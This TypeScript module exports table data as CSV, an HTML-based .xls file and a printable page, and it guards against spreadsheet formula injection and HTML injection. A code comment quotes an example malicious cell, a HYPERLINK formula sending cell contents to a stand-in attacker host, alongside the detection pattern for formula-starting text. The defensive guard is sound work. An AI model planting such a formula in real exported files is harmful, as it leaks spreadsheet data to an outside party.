export type ExportRow = Record<string, string | number | boolean | null | undefined>;

function safeFilePart(value: string) {
  return (
    value
      .trim()
      .replace(/[^a-z0-9]+/gi, '-')
      .replace(/^-+|-+$/g, '')
      .toLowerCase() || 'export'
  );
}

function escapeHtml(value: unknown) {
  return String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// B3, QA SEC-07 (RV1-9): a text cell that starts with =, +, -, @, a tab or a carriage return is read by a spreadsheet as a formula, so a customer note such as
// =HYPERLINK("http://evil.example/?"&A1,"click") could run when the owner opens the file. It is written with a single quote in front, which makes it text. A number is not touched
// (a JavaScript number is never a formula, and -250 must stay a number). This is the ONE guard: the zip of Download everything (src/lib/downloadEverything.ts), `csvCell` below
// (downloadCsv) and the HTML cell writer of downloadExcel all go through it, so a new export cannot forget it by writing its own.
const FORMULA_START = /^[=+\-@\t\r]/;

/** The text a spreadsheet may be given for this cell: a formula-looking text with a single quote in front, a number or a boolean as it is, nothing as the empty text. */
export function guardFormula(value: unknown): string {
  if (value === null || value === undefined) return '';
  if (typeof value !== 'string') return String(value);
  return FORMULA_START.test(value) ? `'${value}` : value;
}

/** RFC 4180: a text with a comma, a quote or a line break is put in quotes, the quotes in it doubled. The text is written as it is: guard it first (`guardFormula`). */
export function csvQuote(text: string) {
  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

function csvCell(value: unknown) {
  return csvQuote(guardFormula(value));
}

/** Hands the content to the browser as a file to save. `revokeAfterMs`: how long the address of the file lives (a big file needs longer than a small one). */
export function saveFile(
  content: BlobPart,
  mimeType: string,
  filename: string,
  revokeAfterMs = 500
) {
  const blob = new Blob([content], { type: mimeType });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  link.remove();
  window.setTimeout(() => URL.revokeObjectURL(url), revokeAfterMs);
}

function columnsFor(rows: ExportRow[]) {
  const seen = new Set<string>();
  for (const row of rows) {
    Object.keys(row).forEach((key) => seen.add(key));
  }
  return Array.from(seen);
}

/** The row as a spreadsheet will read it: every value through the formula guard. */
function guardedRow(row: ExportRow): ExportRow {
  return Object.fromEntries(Object.entries(row).map(([key, value]) => [key, guardFormula(value)]));
}

// `spreadsheet`: the page is saved as an .xls that Excel opens (downloadExcel), so its cells and its column names pass the formula guard; the print window (printPdf) is read by a person
// and is left as it is. Every value in either page passes through escapeHtml (PT-RV1c reads this function and fails on one that does not).
function reportTableHtml(title: string, rows: ExportRow[], subtitle?: string, spreadsheet = false) {
  const columns = columnsFor(rows);
  const heads = spreadsheet ? columns.map(guardFormula) : columns;
  const cells = spreadsheet ? rows.map(guardedRow) : rows;
  const generated = new Date().toLocaleString('en-IN');
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>${escapeHtml(title)}</title>
  <style>
    body { font-family: Arial, sans-serif; color: #111; margin: 24px; }
    h1 { margin: 0 0 4px; font-size: 22px; }
    p { margin: 0 0 14px; color: #555; font-size: 12px; }
    table { width: 100%; border-collapse: collapse; font-size: 11px; }
    th, td { border: 1px solid #ddd; padding: 6px 7px; text-align: left; vertical-align: top; }
    th { background: #f2f2f2; text-transform: uppercase; font-size: 10px; }
    @media print { body { margin: 10mm; } }
  </style>
</head>
<body>
  <h1>${escapeHtml(title)}</h1>
  <p>${escapeHtml(subtitle ? `${subtitle} · Generated ${generated}` : `Generated ${generated}`)}</p>
  <table>
    <thead><tr>${heads.map((column) => `<th>${escapeHtml(column)}</th>`).join('')}</tr></thead>
    <tbody>
      ${
        rows.length === 0
          ? `<tr><td colspan="${Math.max(1, columns.length)}">No records found</td></tr>`
          : cells
              .map(
                (row) =>
                  `<tr>${columns.map((column) => `<td>${escapeHtml(row[column])}</td>`).join('')}</tr>`
              )
              .join('')
      }
    </tbody>
  </table>
</body>
</html>`;
}

export function downloadCsv(title: string, rows: ExportRow[]) {
  const columns = columnsFor(rows);
  const csv = [
    columns.map(csvCell).join(','),
    ...rows.map((row) => columns.map((column) => csvCell(row[column])).join(',')),
  ].join('\r\n');
  saveFile(`\ufeff${csv}`, 'text/csv;charset=utf-8', `${safeFilePart(title)}.csv`);
}

export function downloadExcel(title: string, rows: ExportRow[], subtitle?: string) {
  const html = reportTableHtml(title, rows, subtitle, true);
  saveFile(`\ufeff${html}`, 'application/vnd.ms-excel;charset=utf-8', `${safeFilePart(title)}.xls`);
}

export function printPdf(title: string, rows: ExportRow[], subtitle?: string) {
  const printWindow = window.open('', '_blank', 'width=1100,height=800');
  if (!printWindow) {
    alert('Please allow pop-ups to print/export PDF.');
    return;
  }
  printWindow.document.open();
  printWindow.document.write(reportTableHtml(title, rows, subtitle));
  printWindow.document.close();
  printWindow.focus();
  printWindow.setTimeout(() => {
    printWindow.print();
  }, 250);
}
